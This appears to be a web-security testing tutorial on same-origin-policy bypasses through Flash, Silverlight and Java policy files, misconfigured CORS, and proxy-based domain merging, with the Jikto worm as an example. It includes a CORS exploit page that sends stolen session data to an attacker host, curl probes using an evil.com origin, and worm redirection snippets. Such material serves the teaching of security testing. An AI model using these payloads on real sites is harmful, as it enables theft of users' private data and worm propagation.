## **Same-Origin Policy Revisited**

The **Same-Origin Policy (SOP)** is the cornerstone of web security.
It restricts how documents or scripts loaded from one origin can interact with resources from another origin.

Up until now, we’ve focused on **HTML** and **JavaScript**. But SOP applies to more than that — **browser extensions, plugins, and runtimes** have their own quirks. These quirks can lead to **cross-domain data theft or remote action execution** if misconfigured.

---

## **1. Browser Extensions & SOP**

Most browser extension technologies (ActiveX, NPAPI, etc.) enforce SOP in a similar way to browsers, but:

* They **often bypass built-in browser restrictions** for performance or functionality.
* Vulnerabilities in an extension can directly lead to cross-domain attacks.
* If an extension processes cross-origin content incorrectly (e.g., merging DOMs, ignoring MIME checks), it can expose sensitive data.

💡 **Testing Tip:**
Check whether any installed or required extensions allow loading of external resources, and whether those resources execute with the same privileges as the primary app.

---

## **2. Flash and SOP**

**How Flash Determines Origin:**

* Based on the **domain of the SWF file** (not the embedding HTML).
* SOP segregation is by **protocol, hostname, and port**.
* Flash can make cross-domain requests using `URLRequest` with **full control over headers and POST bodies**.
* Cookies are sent with these requests.
* **Responses are NOT accessible** by default unless the target domain explicitly allows it.

### **Flash Cross-Domain Policy**

* Defined in `/crossdomain.xml` on the target domain.
* Grants full read/write interaction between Flash objects and the target site.

Example:

```xml
<?xml version="1.0"?>
<cross-domain-policy>
  <site-control permitted-cross-domain-policies="by-content-type"/>
  <allow-access-from domain="*.macromedia.com"/>
  <allow-access-from domain="*.adobe.com"/>
  <allow-access-from domain="*.photoshop.com"/>
  <allow-access-from domain="*.acrobat.com"/>
</cross-domain-policy>
```

---

### **Hack Steps for Flash**

1. **Check for a Policy File:**

   ```
   https://target.com/crossdomain.xml
   ```
2. **Danger Signs:**

   * `<allow-access-from domain="*"/>` — any site can hijack sessions and perform actions.
   * Wildcard access to subdomains or sibling domains — vulnerable to XSS on those domains.
3. **Exploitation Scenarios:**

   * Attacker buys Flash ads on an allowed domain → gains full access to target domain.
   * Policy file leaks intranet hostnames or sensitive internal URLs.
4. **Custom Policy Loading Risk:**

   * If `/crossdomain.xml` is missing, a SWF can request a **custom policy file URL**.
   * If attacker can upload **arbitrary XML** with correct MIME type to the target, they can enable cross-domain access.

---

## **3. Silverlight and SOP**

**How Silverlight Determines Origin:**

* Same as Flash: origin = **domain of XAP file**.
* **Key Difference:** Silverlight **ignores protocol and port differences**.

  * HTTP-loaded object can interact with HTTPS endpoints on same domain.

### **Silverlight Cross-Domain Policy**

* Defined in `/clientaccesspolicy.xml`.

Example:

```xml
<?xml version="1.0" encoding="utf-8"?>
<access-policy>
  <cross-domain-access>
    <policy>
      <allow-from>
        <domain uri="http://www.microsoft.com"/>
        <domain uri="http://i.microsoft.com"/>
      </allow-from>
      <grant-to>
        <resource path="/" include-subpaths="true"/>
      </grant-to>
    </policy>
  </cross-domain-access>
</access-policy>
```

**Important Notes:**

* If no Silverlight policy file exists, it falls back to **Flash’s `/crossdomain.xml`** if present.
* Cannot specify custom policy URLs (unlike Flash).

**Hack Steps:**

1. Test `/clientaccesspolicy.xml` for wildcard or broad domain access.
2. If absent, check `/crossdomain.xml`.
3. Identify other allowed domains for XSS or content injection → pivot into the target.

---

## **4. Java and SOP**

**Java Applet Origin Rules:**

* Origin = **domain of the JAR/applet file**, not embedding HTML page.
* SOP mostly follows browser rules.
* **Unique Quirk:** In some cases, other domains sharing the **same IP address** are treated as same-origin.

  * This can occur in **shared hosting** environments, enabling cross-domain data access.

**Hack Steps:**

1. Identify applet hosting domain → resolve to IP.
2. Reverse-lookup IP → list other domains.
3. Test applet-based interactions with those domains.

---

## **Key Takeaways**

* **Flash & Silverlight**: Policies can explicitly grant cross-domain access — misconfiguration is deadly.
* **Flash** is more dangerous due to **custom policy URL support**.
* **Silverlight** ignores protocol/port differences — SSL downgrade risks.
* **Java** can sometimes treat unrelated domains as same-origin due to shared IP rules.
* Even if your app doesn’t use these technologies, **if your domain hosts an accessible policy file**, it may be abused.

---

## **The Same-Origin Policy and HTML5**

### **What’s Happening**

HTML5 introduced enhancements to **XMLHttpRequest (XHR)** through the **Cross-Origin Resource Sharing (CORS)** mechanism. Traditionally, XHR requests could only be made to the same origin as the calling script. With HTML5/CORS, controlled **two-way cross-domain communication** is possible if the target server explicitly allows it via HTTP headers.

Two main request types exist:

1. **Simple Requests** – These use standard HTTP methods (`GET`, `POST`, `HEAD`) and safe `Content-Type` values. The browser sends the request directly and then checks response headers to see if the calling script can access the response body.
2. **Preflighted Requests** – These are “non-simple” requests (e.g., `PUT`, `DELETE`, `PATCH`, or custom headers). Before sending the main request, the browser sends an **OPTIONS preflight request** to ask the target server what’s allowed.

**Key Browser Behavior:**

* Every cross-domain request includes an **Origin** header:

  ```
  Origin: http://attacker.com
  ```
* The target server decides whether to allow the request using **Access-Control-Allow-Origin** and related CORS headers.
* If `Access-Control-Allow-Origin` is `*`, it allows **any domain** to read the response. This can be dangerous if sensitive data is exposed.

---

### **Why This Matters for Security**

* **Improper CORS configuration** can allow attackers to steal sensitive data from authenticated sessions.
* **OPTIONS preflight responses** can unintentionally reveal supported HTTP methods, allowed headers, and API capabilities.
* The enhanced capabilities of XHR can enable **client-side Remote File Inclusion (RFI)**, **cross-domain port scanning**, or **browser-based DDoS** attacks.

---

### **Example: Exploiting Misconfigured CORS**

**Scenario:**
Target API at `https://victim.com` has:

```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

If the browser also allows credentials (`withCredentials = true`), this combination can be **devastating**, because `*` is not valid with credentials — but some developers mistakenly allow both.

**Attacker’s Exploit Page (`http://attacker.com`):**

```html
<script>
fetch("https://victim.com/api/userinfo", {
  method: "GET",
  credentials: "include" // sends victim's cookies
})
.then(res => res.text())
.then(data => {
  console.log("Stolen data:", data);
  // Send stolen data to attacker's server
  fetch("http://attacker.com/steal?data=" + encodeURIComponent(data));
});
</script>
```

If CORS is misconfigured, the attacker gets **private user data** from the victim’s authenticated session.

---

### **HACK STEPS**

1. **Test CORS Headers**

   * Send a request with a fake Origin header:

     ```
     Origin: http://evil.com
     ```
   * Look for `Access-Control-Allow-Origin` in the response.
   * If `*` or your test domain appears, note potential exposure.

2. **Test OPTIONS Preflight**

   * Send an OPTIONS request with:

     ```
     Access-Control-Request-Method: PUT
     Access-Control-Request-Headers: X-Custom-Header
     ```
   * See what methods and headers are allowed.

3. **Check for Credential Leaks**

   * If `Access-Control-Allow-Credentials: true` and ACAO is not a strict whitelist, the app is vulnerable.

4. **Test for Client-Side File Inclusion**

   * Identify endpoints that fetch files based on a URL parameter.
   * Try pointing them to your own controlled domain.

5. **Test for Cross-Domain Port Scanning**

   * Use XHR to request URLs with different ports on internal IPs and observe response timing differences.

---

### **Example Preflight Test with cURL**

```bash
curl -i -X OPTIONS https://victim.com/api/data \
-H "Origin: http://evil.com" \
-H "Access-Control-Request-Method: PUT" \
-H "Access-Control-Request-Headers: X-Auth-Token"
```

**Why:** Reveals what methods/headers are allowed for cross-domain requests.

---

### **Key Exploitation Risks**

* **Data Theft** from authenticated sessions.
* **API Abuse** by unauthorized domains.
* **Internal Network Recon** via port scanning.
* **Amplified DDoS** using many browsers as unwilling bots.

---

## **Crossing Domains with Proxy Service Applications**

### **What’s Happening**

Some public web apps (e.g., **Google Translate**, **Wayback Machine**, **web-based PDF converters**, **online validators**) act as **proxy services** — they fetch a target page from another domain and then serve it from their **own domain**.

**Key Point:**
When two different external sites are accessed via the same proxy, the browser sees both as coming from **the proxy’s domain**, which bypasses the usual same-origin restrictions for content retrieved through that proxy.

**Example:**

* Without proxy:

  * `siteA.com` JS cannot read DOM from `siteB.com` due to SOP (Same-Origin Policy).
* With proxy:

  * Both `siteA` and `siteB` are fetched via `translate.google.com` → now **same origin** (GT domain).
  * Their DOMs can now interact freely.

---

### **Why This Matters for Security**

* Even if cookies for the real domain aren’t sent (since the proxy is a different domain), the attacker **can fully interact with any unauthenticated/public parts** of the site via the proxy.
* This opens the door for **client-side worms**, automated scanning, and cross-site content manipulation.
* The **Jikto worm** is a prime example: it used a proxy to hop between domains and spread via persistent XSS.

---

### **Attack Flow (Jikto Worm as Example)**

1. **Initial Execution**

   * The malicious script checks if it’s running inside the proxy domain (e.g., `translate.google.com`).
   * If not, it reloads the same page through the proxy service.

2. **Domain Merging via Proxy**

   * Now the script runs **inside** the proxy’s origin.
   * It can load **public content** from multiple external domains **through** the proxy and interact with them freely.

3. **Scanning for XSS**

   * The script scans the target site for persistent XSS in public endpoints (forums, message boards, guestbooks).

4. **Self-Replication**

   * If XSS is found, it injects a copy of itself into the vulnerable site.

5. **Propagation**

   * When a new user visits the infected site, the script runs, repeats the proxy redirection, and starts over.

---

### **Practical Example**

**Step 1 – Loading a Target Site via Proxy**

```html
<script>
// Force load target site via Google Translate
if (!location.hostname.includes("translate.google.com")) {
    location.href = "https://translate.google.com/translate?sl=en&tl=en&u=" + encodeURIComponent(location.href);
}
</script>
```

**Step 2 – Fetching Public Content from Another Site**

```html
<script>
fetch("https://translate.google.com/translate?sl=en&tl=en&u=https://targetsite.com/public-page")
  .then(res => res.text())
  .then(html => {
    // Now same-origin (GT domain), so we can parse and interact with DOM
    console.log("Fetched public content:", html);
  });
</script>
```

---

### **HACK STEPS**

1. **Identify Proxy Services**

   * Examples: Google Translate, archive.org, text-only web proxies, web-to-PDF tools.
   * Confirm that they serve external content **within their own domain**.

2. **Test Domain Merging**

   * Load two different external domains via the same proxy.
   * Try cross-frame or DOM manipulation between them — if it works, SOP is bypassed for public content.

3. **Check for XSS in Public Areas**

   * Use automated or manual scanning to find persistent XSS vulnerabilities in publicly accessible endpoints.

4. **Create a Proof-of-Concept Worm**

   * Self-replicating script that:

     * Ensures it runs in proxy domain.
     * Fetches other target domains via the same proxy.
     * Injects itself into any found XSS points.

5. **Leverage for Recon or Data Gathering**

   * Even without XSS, attackers can scrape, modify, or combine public data from multiple domains in the browser.

---

### **Key Exploitation Risks**

* SOP bypass for **public-facing content**.
* Enabling **multi-domain JavaScript interaction** via a shared proxy domain.
* Self-propagating worms (e.g., Jikto) using public XSS to spread.
* Large-scale **content scraping** or **manipulation**.

---
